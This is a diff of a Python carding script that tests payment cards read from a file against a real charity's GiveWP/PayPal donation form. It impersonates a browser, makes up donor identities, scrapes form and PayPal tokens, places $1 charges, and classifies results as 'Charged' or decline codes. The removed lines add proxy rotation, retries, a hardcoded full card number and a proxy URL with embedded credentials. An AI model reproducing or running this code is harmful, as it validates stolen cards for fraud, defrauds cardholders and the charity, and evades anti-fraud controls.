@@ -1,402 +1,291 @@
-import asyncio
-import re
-import json
 import base64
+import json
+import re
 import secrets
-import uuid
 from faker import Faker
-from curl_cffi.requests import AsyncSession
-from proxy_manager import get_next_proxy
+from curl_cffi import requests
 
-fake = Faker("en_US")
+# إنشاء جلسة curl_cffi ومحاكاة متصفح كروم 124
+r = requests.Session(impersonate="chrome124")
+fake = Faker("en_UK")
 
-class tools:
-    @staticmethod
-    def getcard(card: str) -> dict:
+with open("b.txt", "r") as file:
+    for line in file:
+        card = line.strip()
+        if not card:
+            continue
+
         parts = card.split("|")
-        cc = parts[0].strip() if len(parts) > 0 else ""
-        mm = parts[1].strip() if len(parts) > 1 else ""
-        yy = parts[2].strip() if len(parts) > 2 else ""
-        cvv = parts[3].strip() if len(parts) > 3 else ""
-        
-        mm = mm.zfill(2)
-        
-        if len(yy) == 4:
-            yy = yy[-2:]
-        elif len(yy) == 2:
-            yy = yy
-            
-        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
+        n = parts[0]
+        mm = parts[1]
+        yy = parts[2]
+        cvc = parts[3]
 
-    @staticmethod
-    def find_between(s: str, first: str, last: str) -> str | None:
-        try:
-            return s.split(first, 1)[1].split(last, 1)[0]
-        except (IndexError, AttributeError):
-            return None
+        f = fake.first_name()
+        l = fake.last_name()
+        k = f"{f} {l}"
+        e = f"{f.lower()}.{l.lower()}@gmail.com"
 
-    @staticmethod
-    def userdata() -> dict:
-        fn = fake.first_name()
-        ln = fake.last_name()
-        return {
-            "name": f"{fn} {ln}",
-            "first": fn,
-            "last": ln,
-            "address": fake.street_address(),
-            "city": fake.city(),
-            "state": fake.state_abbr(),
-            "zip": fake.postcode(),
-            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
-            "phone": fake.phone_number(),
+        token = secrets.token_hex(16)
+        print("Client Metadata ID:", token)
+
+        # ------------------------------------------------------------------
+        # Step 1: GET Donation Page
+        # المحذوف: كافة الهيدرز التلقائية
+        # ------------------------------------------------------------------
+        response = r.get("https://bukjeh.org/donations/donation-2023-2-3/")
+
+        hash_match = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
+        pre_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
+        give_match = re.search(r'name="give-form-id" value="(.*?)"', response.text)
+        enc_match = re.search(r'"data-client-token":"(.*?)"', response.text)
+
+        if not (hash_match and pre_match and give_match and enc_match):
+            print("❌ Failed to parse initial parameters from HTML page.")
+            continue
+
+        hash_val = hash_match.group(1)
+        pre = pre_match.group(1)
+        give = give_match.group(1)
+        enc = enc_match.group(1)
+
+        dec = base64.b64decode(enc).decode("utf-8")
+        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
+
+        print("give-form-hash:", hash_val)
+        print("give-form-id-prefix:", pre)
+        print("give-form-id:", give)
+        print("accessToken:", au[:15] + "...")
+
+        # ------------------------------------------------------------------
+        # Step 2: AJAX Process Donation
+        # الضروري فقط: origin, referer, content-type, x-requested-with
+        # ------------------------------------------------------------------
+        headers_step2 = {
+            "origin": "https://bukjeh.org",
+            "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
+            "x-requested-with": "XMLHttpRequest",
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
         }
 
-RESPONSE_MAP = {
-    "true": ("Success", "Charged - $1 ! ✅", True),
-    "sucsess": ("Success", "Charged - $1 ! ✅", True),
-    "do_not_honor": ("Declined", "Do Not Honor ❌", False),
-    "account_closed": ("Declined", "Account Closed ❌", False),
-    "payer_account_locked_or_closed": ("Declined", "Payer Account Locked Or Closed ❌", False),
-    "lost_or_stolen": ("Declined", "Lost Or Stolen ❌", False),
-    "cvv2_failure": ("Declined", "CVV2_FAILURE ❌", False),
-    "suspected_fraud": ("Declined", "Suspected Fraud ❌", False),
-    "invalid_account": ("Declined", "Invalid Account ❌", False),
-    "reattempt_not_permitted": ("Declined", "Reattempt Not Permitted ❌", False),
-    "account_blocked_by_issuer": ("Declined", "Account Blocked By Issuer ❌", False),
-    "order_not_approved": ("Declined", "Order Not Approved ❌", False),
-    "pickup_card_special_conditions": ("Declined", "Pick Card Special Conditions ❌", False),
-    "payer_cannot_pay": ("Declined", "Payer Cannot Pay ❌", False),
-    "insufficient_funds": ("Declined", "Insufficient Funds ❌", False),
-    "generic_decline": ("Declined", "Generic Decline ❌", False),
-    "compliance_violation": ("Declined", "Compliance Violation ❌", False),
-    "transaction_not_permitted": ("Declined", "Transaction Not Permitted ❌", False),
-    "payment_denied": ("Declined", "Payment Denied ❌", False),
-    "invalid_transaction": ("Declined", "Invalid Transaction ❌", False),
-    "restricted_or_inactive_account": ("Declined", "Restricted Or Inactive Account ❌", False),
-    "security_violation": ("Declined", "Security Violation ❌", False),
-    "declined_due_to_updated_account": ("Declined", "Declined Due To Updated Account ❌", False),
-    "invalid_or_restricted_card": ("Declined", "Invalid Or Restricted Card ❌", False),
-    "expired_card": ("Declined", "Expired Card ❌", False),
-    "cryptographic_failure": ("Declined", "CRYPTOGRAPHIC_FAILURE ❌", False),
-    "transaction_cannot_be_completed": ("Declined", "TRANSACTION_CANNOT_BE_COMPLETED ❌", False),
-    "declined_please_retry": ("Declined", "DECLINED_PLEASE_RETRY_LATER ❌", False),
-    "tx_attempts_exceed_limit": ("Declined", "TX_ATTEMPTS_EXCEED_LIMIT ❌", False),
-}
+        data_step2 = {
+            "give-fee-amount": "0",
+            "give-fee-mode-enable": "false",
+            "give-fee-status": "enabled",
+            "give-honeypot": "",
+            "give-form-id-prefix": pre,
+            "give-form-id": give,
+            "give-form-title": "Help us make A’amar",
+            "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
+            "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
+            "give-form-minimum": "1.00",
+            "give-form-maximum": "999999.99",
+            "give-form-hash": hash_val,
+            "give-price-id": "3",
+            "give-recurring-logged-in-only": "",
+            "give-logged-in-only": "1",
+            "_give_is_donation_recurring": "0",
+            "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
+            "give-amount": "1.00",
+            "give-recurring-period-donors-choice": "month",
+            "payment-mode": "paypal-commerce",
+            "give_first": f,
+            "give_last": l,
+            "give_email": e,
+            "card_name": k,
+            "card_exp_month": "",
+            "card_exp_year": "",
+            "give_action": "purchase",
+            "give-gateway": "paypal-commerce",
+            "action": "give_process_donation",
+            "give_ajax": "true",
+        }
 
-class Gateway:
-    @staticmethod
-    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
-        token = secrets.token_hex(16)
-
-        async with AsyncSession(impersonate="chrome120", proxies=proxies) as session:
-            try:
-                # ----------------------------------------------------
-                # Step 1: GET donation page
-                # ----------------------------------------------------
-                print("\n[🌐 Step 1] Requesting Donation Page...")
-                headers_init = {
-                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
-                }
-                resp_init = await session.get(
-                    "https://bukjeh.org/donations/donation-2023-2-3/",
-                    headers=headers_init,
-                )
-                print(f"   ├─ Status Code: {resp_init.status_code}")
-                
-                html = resp_init.text
-                hash_val = tools.find_between(html, 'name="give-form-hash" value="', '"')
-                pre = tools.find_between(html, 'name="give-form-id-prefix" value="', '"')
-                give = tools.find_between(html, 'name="give-form-id" value="', '"')
-
-                print(f"   ├─ Hash: {hash_val}")
-                print(f"   ├─ Prefix: {pre}")
-                print(f"   └─ Give ID: {give}")
-
-                if not hash_val or not pre or not give:
-                    print("   ❌ [Error in Step 1] Could not parse form fields from HTML.")
-                    print(f"   └─ HTML Preview (First 300 chars): {html[:300].strip()}")
-                    return "Error", "Missing form parameters", False
-
-                enc_match = re.search(r'"data-client-token":"(.*?)"', html)
-                if not enc_match:
-                    print("   ❌ [Error in Step 1] data-client-token not found.")
-                    return "Error", "data-client-token not found", False
-                
-                enc = enc_match.group(1)
-                dec = base64.b64decode(enc).decode("utf-8")
-                au_match = re.search(r'"accessToken":"(.*?)"', dec)
-                if not au_match:
-                    print("   ❌ [Error in Step 1] accessToken not found.")
-                    return "Error", "accessToken not found", False
-                
-                au = au_match.group(1)
-                print(f"   └─ AccessToken Extracted Successfully! ({au[:15]}...)")
-
-                # ----------------------------------------------------
-                # Step 2: First AJAX - give_process_donation
-                # ----------------------------------------------------
-                print("\n[⚡ Step 2] Sending give_process_donation...")
-                headers_ajax1 = {
-                    "origin": "https://bukjeh.org",
-                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
-                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                    "x-requested-with": "XMLHttpRequest",
-                }
-                data_ajax1 = {
-                    "give-fee-amount": "0",
-                    "give-fee-mode-enable": "false",
-                    "give-fee-status": "enabled",
-                    "give-honeypot": "",
-                    "give-form-id-prefix": pre,
-                    "give-form-id": give,
-                    "give-form-title": "Help us make A’amar",
-                    "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
-                    "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
-                    "give-form-minimum": "1.00",
-                    "give-form-maximum": "999999.99",
-                    "give-form-hash": hash_val,
-                    "give-price-id": "3",
-                    "give-recurring-logged-in-only": "",
-                    "give-logged-in-only": "1",
-                    "_give_is_donation_recurring": "0",
-                    "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
-                    "give-amount": "1.00",
-                    "give-recurring-period-donors-choice": "month",
-                    "payment-mode": "paypal-commerce",
-                    "give_first": user_data["first"],
-                    "give_last": user_data["last"],
-                    "give_email": user_data["email"],
-                    "card_name": user_data["name"],
-                    "card_exp_month": "",
-                    "card_exp_year": "",
-                    "give_action": "purchase",
-                    "give-gateway": "paypal-commerce",
-                    "action": "give_process_donation",
-                    "give_ajax": "true",
-                }
-                resp_ajax1 = await session.post(
-                    "https://bukjeh.org/wp-admin/admin-ajax.php",
-                    headers=headers_ajax1,
-                    data=data_ajax1,
-                )
-                print(f"   ├─ Status Code: {resp_ajax1.status_code}")
-                print(f"   └─ Response: {resp_ajax1.text[:200]}")
-
-                # ----------------------------------------------------
-                # Step 3: Second AJAX - create order
-                # ----------------------------------------------------
-                print("\n[⚡ Step 3] Creating PayPal Order (create_order)...")
-                headers_ajax2 = {
-                    "origin": "https://bukjeh.org",
-                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
-                }
-                params_ajax2 = {
-                    "action": "give_paypal_commerce_create_order",
-                }
-                files_ajax2 = {
-                    "give-fee-amount": (None, "0"),
-                    "give-fee-mode-enable": (None, "false"),
-                    "give-fee-status": (None, "enabled"),
-                    "give-honeypot": (None, ""),
-                    "give-form-id-prefix": (None, pre),
-                    "give-form-id": (None, give),
-                    "give-form-title": (None, "Help us make A’amar"),
-                    "give-current-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
-                    "give-form-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
-                    "give-form-minimum": (None, "1.00"),
-                    "give-form-maximum": (None, "999999.99"),
-                    "give-form-hash": (None, hash_val),
-                    "give-price-id": (None, "3"),
-                    "give-recurring-logged-in-only": (None, ""),
-                    "give-logged-in-only": (None, "1"),
-                    "_give_is_donation_recurring": (None, "0"),
-                    "give_recurring_donation_details": (None, '{"give_recurring_option":"yes_donor"}'),
-                    "give-amount": (None, "1.00"),
-                    "give-recurring-period-donors-choice": (None, "month"),
-                    "give_stripe_payment_method": (None, ""),
-                    "payment-mode": (None, "paypal-commerce"),
-                    "give_first": (None, user_data["first"]),
-                    "give_last": (None, user_data["last"]),
-                    "give_email": (None, user_data["email"]),
-                    "card_name": (None, user_data["name"]),
-                    "card_exp_month": (None, ""),
-                    "card_exp_year": (None, ""),
-                    "give-gateway": (None, "paypal-commerce"),
-                }
-                resp_ajax2 = await session.post(
-                    "https://bukjeh.org/wp-admin/admin-ajax.php",
-                    params=params_ajax2,
-                    headers=headers_ajax2,
-                    files=files_ajax2,
-                )
-                print(f"   ├─ Status Code: {resp_ajax2.status_code}")
-                print(f"   └─ Response Text: {resp_ajax2.text}")
-
-                try:
-                    ajax2_json = resp_ajax2.json()
-                    order_id = ajax2_json.get("data", {}).get("id")
-                except Exception:
-                    order_id = None
-
-                if not order_id:
-                    print("   ❌ [Error in Step 3] Failed to get order_id.")
-                    return "Error", "Failed to create PayPal order", False
-
-                print(f"   └─ Order ID Created: {order_id}")
-
-                # ----------------------------------------------------
-                # Step 4: Confirm payment source via PayPal
-                # ----------------------------------------------------
-                print("\n[💳 Step 4] Confirming Payment with PayPal API...")
-                headers_paypal = {
-                    "authorization": f"Bearer {au}",
-                    "origin": "https://assets.braintreegateway.com",
-                    "referer": "https://assets.braintreegateway.com/",
-                    "content-type": "application/json",
-                    "paypal-client-metadata-id": token,
-                }
-                json_paypal = {
-                    "payment_source": {
-                        "card": {
-                            "number": card_data["cc"],
-                            "expiry": f"20{card_data['yy']}-{card_data['mm']}",
-                            "security_code": card_data["cvv"],
-                            "attributes": {
-                                "verification": {
-                                    "method": "SCA_WHEN_REQUIRED",
-                                },
-                            },
-                        },
-                    },
-                    "application_context": {
-                        "vault": False,
-                    },
-                }
-                resp_paypal = await session.post(
-                    f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
-                    headers=headers_paypal,
-                    json=json_paypal,
-                )
-                print(f"   ├─ Status Code: {resp_paypal.status_code}")
-                print(f"   └─ Response: {resp_paypal.text[:250]}")
-                
-                paypal_text = resp_paypal.text.lower()
-
-                # ----------------------------------------------------
-                # Step 5: Third AJAX - approve order
-                # ----------------------------------------------------
-                print("\n[⚡ Step 5] Approving Order (approve_order)...")
-                headers_ajax3 = {
-                    "origin": "https://bukjeh.org",
-                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
-                }
-                params_ajax3 = {
-                    "action": "give_paypal_commerce_approve_order",
-                    "order": order_id,
-                }
-                files_ajax3 = {
-                    "give-fee-amount": (None, "0"),
-                    "give-fee-mode-enable": (None, "false"),
-                    "give-fee-status": (None, "enabled"),
-                    "give-honeypot": (None, ""),
-                    "give-form-id-prefix": (None, pre),
-                    "give-form-id": (None, give),
-                    "give-form-title": (None, "Help us make A’amar"),
-                    "give-current-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
-                    "give-form-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
-                    "give-form-minimum": (None, "1.00"),
-                    "give-form-maximum": (None, "999999.99"),
-                    "give-form-hash": (None, hash_val),
-                    "give-price-id": (None, "3"),
-                    "give-recurring-logged-in-only": (None, ""),
-                    "give-logged-in-only": (None, "1"),
-                    "_give_is_donation_recurring": (None, "0"),
-                    "give_recurring_donation_details": (None, '{"give_recurring_option":"yes_donor"}'),
-                    "give-amount": (None, "1.00"),
-                    "give-recurring-period-donors-choice": (None, "month"),
-                    "give_stripe_payment_method": (None, ""),
-                    "payment-mode": (None, "paypal-commerce"),
-                    "give_first": (None, user_data["first"]),
-                    "give_last": (None, user_data["last"]),
-                    "give_email": (None, user_data["email"]),
-                    "card_name": (None, user_data["name"]),
-                    "card_exp_month": (None, ""),
-                    "card_exp_year": (None, ""),
-                    "give-gateway": (None, "paypal-commerce"),
-                }
-                resp_ajax3 = await session.post(
-                    "https://bukjeh.org/wp-admin/admin-ajax.php",
-                    params=params_ajax3,
-                    headers=headers_ajax3,
-                    files=files_ajax3,
-                )
-                print(f"   ├─ Status Code: {resp_ajax3.status_code}")
-                print(f"   └─ Response: {resp_ajax3.text}")
-
-                approve_text = resp_ajax3.text.lower()
-                combined = paypal_text + " " + approve_text
-
-                for key, (status, msg, is_live) in RESPONSE_MAP.items():
-                    if key in combined:
-                        return status, msg, is_live
-
-                try:
-                    error_data = resp_ajax3.json()
-                    if 'data' in error_data and 'error' in error_data['data']:
-                        err_msg = error_data['data']['error']
-                        return "Declined", f"{err_msg} ❌", False
-                except Exception:
-                    pass
-
-                return "Unknown", "Unrecognised response ❓", False
-
-            except Exception as e:
-                print(f"\n❌ [Exception Captured]: {str(e)}")
-                return "Error", f"Exception: {str(e)}", False
-
-
-async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
-    card_data = tools.getcard(card_line)
-    if not card_data["cc"]:
-        return "Failed", "Invalid card format", False
-
-    max_attempts = 5
-
-    for attempt in range(max_attempts):
-        print(f"\n==================== Attempt {attempt + 1}/{max_attempts} ====================")
-        user_data = tools.userdata()
-        proxy_url_new = get_next_proxy()
-        proxies = {"http": proxy_url_new, "https": proxy_url_new} if proxy_url_new else None
-
-        status, msg, is_live = await Gateway.charge_card(
-            card_data=card_data,
-            user_data=user_data,
-            proxies=proxies,
+        response = r.post(
+            "https://bukjeh.org/wp-admin/admin-ajax.php",
+            headers=headers_step2,
+            data=data_step2,
         )
 
-        if "Order Not Approved" in msg:
-            if attempt == max_attempts - 1:
-                return status, msg, is_live
+        # ------------------------------------------------------------------
+        # Step 3: Create PayPal Order
+        # الضروري فقط: origin, referer
+        # (Content-Type يتم إنشاؤه تلقائياً بصيغة multipart عند استخدام files)
+        # ------------------------------------------------------------------
+        headers_step3 = {
+            "origin": "https://bukjeh.org",
+            "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
+        }
+
+        params_step3 = {"action": "give_paypal_commerce_create_order"}
+
+        files_step3 = {
+            "give-fee-amount": (None, "0"),
+            "give-fee-mode-enable": (None, "false"),
+            "give-fee-status": (None, "enabled"),
+            "give-honeypot": (None, ""),
+            "give-form-id-prefix": (None, pre),
+            "give-form-id": (None, give),
+            "give-form-title": (None, "Help us make A’amar"),
+            "give-current-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
+            "give-form-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
+            "give-form-minimum": (None, "1.00"),
+            "give-form-maximum": (None, "999999.99"),
+            "give-form-hash": (None, hash_val),
+            "give-price-id": (None, "3"),
+            "give-recurring-logged-in-only": (None, ""),
+            "give-logged-in-only": (None, "1"),
+            "_give_is_donation_recurring": (None, "0"),
+            "give_recurring_donation_details": (None, '{"give_recurring_option":"yes_donor"}'),
+            "give-amount": (None, "1.00"),
+            "give-recurring-period-donors-choice": (None, "month"),
+            "give_stripe_payment_method": (None, ""),
+            "payment-mode": (None, "paypal-commerce"),
+            "give_first": (None, f),
+            "give_last": (None, l),
+            "give_email": (None, e),
+            "card_name": (None, k),
+            "card_exp_month": (None, ""),
+            "card_exp_year": (None, ""),
+            "give-gateway": (None, "paypal-commerce"),
+        }
+
+        response = r.post(
+            "https://bukjeh.org/wp-admin/admin-ajax.php",
+            params=params_step3,
+            headers=headers_step3,
+            files=files_step3,
+        )
+
+        try:
+            order_id = response.json()["data"]["id"]
+            print("Order ID:", order_id)
+        except Exception:
+            print("❌ Failed to retrieve order ID.")
             continue
+
+        # ------------------------------------------------------------------
+        # Step 4: PayPal Confirm Payment Source
+        # الضروري فقط: authorization, braintree-sdk-version, content-type, origin, paypal-client-metadata-id, referer
+        # ------------------------------------------------------------------
+        headers_step4 = {
+            "authorization": f"Bearer {au}",
+            "braintree-sdk-version": "3.32.0-payments-sdk-dev",
+            "content-type": "application/json",
+            "origin": "https://assets.braintreegateway.com",
+            "paypal-client-metadata-id": token,
+            "referer": "https://assets.braintreegateway.com/",
+        }
+
+        json_data_step4 = {
+            "payment_source": {
+                "card": {
+                    "number": n,
+                    "expiry": f"20{yy}-{mm}",
+                    "security_code": cvc,
+                    "attributes": {
+                        "verification": {
+                            "method": "SCA_WHEN_REQUIRED",
+                        },
+                    },
+                },
+            },
+            "application_context": {
+                "vault": False,
+            },
+        }
+
+        response = r.post(
+            f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
+            headers=headers_step4,
+            json=json_data_step4,
+        )
+
+        # ------------------------------------------------------------------
+        # Step 5: Approve Order
+        # الضروري فقط: origin, referer
+        # ------------------------------------------------------------------
+        headers_step5 = {
+            "origin": "https://bukjeh.org",
+            "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
+        }
+
+        params_step5 = {
+            "action": "give_paypal_commerce_approve_order",
+            "order": order_id,
+        }
+
+        response = r.post(
+            "https://bukjeh.org/wp-admin/admin-ajax.php",
+            params=params_step5,
+            headers=headers_step5,
+            files=files_step3,
+        )
+
+        text = response.text
+        status = "UNKNOWN_ERROR"
+
+        if "true" in text or "sucsess" in text:
+            status = "Charged - $1 !"
+        elif "DO_NOT_HONOR" in text:
+            status = "Do Not Honor"
+        elif "ACCOUNT_CLOSED" in text:
+            status = "Account Closed"
+        elif "PAYER_ACCOUNT_LOCKED_OR_CLOSED" in text:
+            status = "Payer Account Locked Or Closed"
+        elif "LOST_OR_STOLEN" in text:
+            status = "Lost Or Stolen"
+        elif "CVV2_FAILURE" in text:
+            status = "CVV2_FAILURE"
+        elif "SUSPECTED_FRAUD" in text:
+            status = "Suspected Fraud"
+        elif "INVALID_ACCOUNT" in text:
+            status = "Invalid Account"
+        elif "REATTEMPT_NOT_PERMITTED" in text:
+            status = "Reattempt Not Permitted"
+        elif "ACCOUNT_BLOCKED_BY_ISSUER" in text:
+            status = "Account Blocked By Issuer"
+        elif "ORDER_NOT_APPROVED" in text:
+            status = "Order Not Approved"
+        elif "PICKUP_CARD_SPECIAL_CONDITIONS" in text:
+            status = "Pick Card Special Conditions"
+        elif "PAYER_CANNOT_PAY" in text:
+            status = "Payer Cannot Pay"
+        elif "INSUFFICIENT_FUNDS" in text:
+            status = "Insufficient Funds"
+        elif "GENERIC_DECLINE" in text:
+            status = "Generic Decline"
+        elif "COMPLIANCE_VIOLATION" in text:
+            status = "Compliance Violation"
+        elif "TRANSACTION_NOT_PERMITTED" in text:
+            status = "Transaction Not Permitted"
+        elif "PAYMENT_DENIED" in text:
+            status = "Payment Denied"
+        elif "INVALID_TRANSACTION" in text:
+            status = "Invalid Transaction"
+        elif "RESTRICTED_OR_INACTIVE_ACCOUNT" in text:
+            status = "Restricted Or Inactive Account"
+        elif "SECURITY_VIOLATION" in text:
+            status = "Security Violation"
+        elif "DECLINED_DUE_TO_UPDATED_ACCOUNT" in text:
+            status = "Declined Due To Update Account"
+        elif "INVALID_OR_RESTRICTED_CARD" in text:
+            status = "Invalid Or Restricted Card"
+        elif "EXPIRED_CARD" in text:
+            status = "Expired Card"
+        elif "CRYPTOGRAPHIC_FAILURE" in text:
+            status = "CRYPTOGRAPHIC_FAILURE"
+        elif "TRANSACTION_CANNOT_BE_COMPLETED" in text:
+            status = "TRANSACTION_CANNOT_BE_COMPLETED"
+        elif "DECLINED_PLEASE_RETRY" in text:
+            status = "DECLINED_PLEASE_RETRY_LATER"
+        elif "TX_ATTEMPTS_EXCEED_LIMIT" in text:
+            status = "TX_ATTEMPTS_EXCEED_LIMIT"
         else:
-            return status, msg, is_live
+            try:
+                error_data = json.loads(text)
+                status = error_data["data"]["error"]
+            except Exception:
+                status = "UNKNOWN_ERROR"
 
-    return "Error", "Max attempts exceeded unexpectedly", False
-    
-async def main():
-    test_card = "4211566115568609|12|28|321"
-    proxy = "http://purevpn0s8732217:i67s60ep@Px121102.pointtoserver.com:10780"
-
-    print("🚀 Testing gateway (ST Charge)...")
-    print(f"💳 Card: {test_card}")
-    print(f"🌐 Connecting via: {proxy}")
-
-    status, message, is_live = await process_paypal_1(test_card, proxy_url=proxy)
-
-    print("\n---------------- FINAL RESULT ----------------")
-    print(f"Status  : {status}")
-    print(f"Message : {message}")
-    print(f"Live    : {is_live}")
-
-if __name__ == "__main__":
-    asyncio.run(main())
+        print("Final Status:", status)
